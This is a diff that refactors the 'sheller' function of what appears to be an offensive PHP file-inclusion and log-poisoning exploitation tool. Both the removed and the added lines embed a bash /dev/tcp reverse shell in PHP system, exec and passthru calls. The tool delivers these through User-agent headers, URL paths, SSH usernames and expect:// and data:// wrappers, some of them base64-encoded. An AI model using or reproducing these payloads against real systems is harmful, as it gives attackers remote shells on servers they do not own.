@@ -572,6 +572,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     break
 
     if success:
+        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(LISTENIP, LISTENPORT)
         if technique != 6:
             if attack == 1:
                 prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
@@ -589,17 +590,17 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 prep.headers["content-length"] = len(newBody)
 
         if technique == 1:
-            prep.headers['User-agent'] = '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php system("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique {}".format(technique))
-            prep.headers['User-agent'] = '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php exec("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique {}".format(technique))
-            prep.headers['User-agent'] = '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
@@ -607,17 +608,17 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         elif technique == 2 or technique == 5:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
-            prep2.url = url + "/" + '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique {}".format(technique))
-            prep2.url = url + "/" + '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique {}".format(technique))
-            prep2.url = url + "/" + '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
@@ -631,9 +632,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
             host = tmp.split("/")[0].split(":")[0]
-            sshs = ['<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-                    '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-                    '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
+            sshs = ['<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
+                    '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
+                    '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)]
             for ssh in sshs:
                 try:
                     if sys.platform.lower().startswith("win"):
@@ -650,9 +651,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             tmp = url.split("://")[1]
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
-            topics = ['I<3shells <?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
-                      'I<3shells <?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
-                      'I<3shells <?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)]
+            topics = ['I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
+                      'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
+                      'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)]
             host = tmp.split("/")[0].split(":")[0]
             for topic in topics:
                 try:
@@ -666,16 +667,13 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 print("Timeout reached @technique {}".format(technique))
         elif technique == 6:
             wrappers = [
-                'expect://bash -i >& /dev/tcp/{}/{} 0>&1'.format(LISTENIP, LISTENPORT),
-                'data://text/plain,<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
-                'data://text/plain,<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
-                'data://text/plain,<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
-                'data://text/plain;base64,'
-                + encode64('<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)),
-                'data://text/plain;base64,'
-                + encode64('<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)),
-                'data://text/plain;base64,'
-                + encode64('<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT))
+                'expect://{}'.format(PAYLOAD),
+                'data://text/plain,<?php system("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain,<?php exec("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain,<?php passthru("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain;base64,' + encode64('<?php system("{}"); ?>'.format(PAYLOAD)),
+                'data://text/plain;base64,' + encode64('<?php exec("{}"); ?>'.format(PAYLOAD)),
+                'data://text/plain;base64,' + encode64('<?php passthru("{}"); ?>'.format(PAYLOAD))
             ]
             if attack == 1:
                 for wrapper in wrappers:
